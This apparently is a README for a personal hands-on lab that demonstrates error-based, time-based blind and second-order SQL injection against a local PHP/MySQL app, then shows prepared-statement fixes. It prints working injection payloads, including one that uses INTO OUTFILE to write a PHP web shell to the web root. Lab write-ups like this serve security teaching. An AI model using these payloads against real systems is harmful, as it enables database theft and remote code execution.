# Advanced-SQL-Injection-Lab

A hands-on lab exploring advanced SQL injection techniques (Error-based, Time-blind, and Second-order) including exploitation and secure mitigation strategies.


📌 Project Overview
This repository documents a hands-on cybersecurity lab focused on advanced SQL Injection (SQLi) techniques. The lab demonstrates how to identify and exploit vulnerabilities within a custom-built PHP/MySQL web application and provides the necessary secure coding mitigations.

🏗️ Lab Environment
OS: Kali Linux

Server Stack: XAMPP for Linux 8.6.30-0 (Apache & MySQL)

Database: vulnerable_db

Application: PHP-based web application consisting of registration, login, and product search modules.

🚩 Phase 1: Exploitation Walkthrough

1. Error-Based SQL Injection
File: search.php

Objective: Extract sensitive database metadata via the search interface.


Payloads Used:

Database Version: ' UNION SELECT NULL, version(), NULL #

Result: Extracted version 10.4.32-MariaDB.

Database Name: ' UNION SELECT NULL, database(), NULL #

Result: Confirmed name vulnerable_db.

Current User: ' UNION SELECT NULL, user(), NULL #

Result: Confirmed user root@localhost.

2. Time-Based Blind SQL Injection
File: login.php

Objective: Verify vulnerability when no data is returned to the UI by observing server response times.

Payload: admin' AND SLEEP(5) #

Result: The application experienced a 5-second delay before responding, confirming the injection point.

3. Second-Order SQL Injection
File: register.php

Objective: Inject a malicious payload during registration that is stored and executed by the system at a later stage.

Payload: admin'--

4. Advanced Exploitation (RCE)
Objective: Achieve Remote Code Execution by writing a web shell to the server using the INTO OUTFILE command.

Payload: ' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/opt/lampp/htdocs/vulnerable_app/shell.php' #

🛡️ Phase 2: Mitigation Strategies
The most effective defense against these attacks is replacing dynamic SQL queries with Prepared Statements.

Vulnerable Code Example:

PHP
$sql = "SELECT * FROM users WHERE username = '$username'"; 
Secure Mitigation (PHP MySQLi):

PHP
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

⚖️ Ethical Disclaimer
This project was performed in a controlled, local environment for educational purposes. Unauthorized testing against external systems is illegal and unethical.

🧠 Final Reflection & Key Learnings
Technical Growth

Vulnerability Analysis: Gained a deep understanding of how unsanitized user input in PHP can lead to critical database compromises.


Advanced Exploitation: Successfully executed complex payloads, including Time-based Blind SQLi and Remote Code Execution (RCE) via INTO OUTFILE.


Defensive Coding: Mastered the implementation of Prepared Statements (Parameterized Queries) as the industry-standard defense against SQL injection.

Challenges Overcome

Environment Setup: Configured the XAMPP stack on Linux and resolved database permission issues to allow for file writing during the RCE phase.


Payload Precision: Learned the importance of exact syntax and URL encoding when bypasssing web filters and interacting with the MySQL backend.

Professional Impact
This lab has significantly enhanced my skills in Web Application Security and Digital Forensics. It provided practical experience in the "Identify, Exploit, and Patch" workflow used by professional penetration testers.
